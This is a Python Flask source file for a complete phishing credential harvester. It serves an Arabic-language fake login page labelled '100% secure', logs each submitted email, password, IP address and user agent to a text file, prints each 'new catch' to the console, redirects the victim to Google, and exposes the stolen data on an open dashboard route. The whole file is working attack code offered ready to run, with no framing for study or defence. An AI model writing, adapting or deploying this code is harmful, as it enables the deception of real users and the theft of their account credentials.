from flask import Flask, request, redirect, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

PAGE = '''
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 400px;
            max-width: 90%;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 28px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: 0.3s;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 تسجيل الدخول</h2>
        <form method="POST" action="/capture">
            <div class="input-group">
                <label>البريد الإلكتروني</label>
                <input type="email" name="email" placeholder="example@email.com" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            نظام آمن 100% 🔒
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    data = {
        'email': email,
        'password': password,
        'ip': ip,
        'user_agent': user_agent,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    with open('captured.txt', 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    print(f"[+] صيد جديد: {email} | {password} | {ip}")
    
    return redirect('https://google.com')

@app.route('/dashboard')
def dashboard():
    try:
        with open('captured.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            if not lines:
                return '<h2>📭 لا توجد بيانات بعد</h2>'
            html = '<h2>📊 لوحة التحكم</h2><pre style="background:#f4f4f4;padding:20px;border-radius:10px;">'
            for line in lines:
                html += line + '\n'
            html += '</pre>'
            return html
    except FileNotFoundError:
        return '<h2>📭 لا توجد بيانات بعد</h2>'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
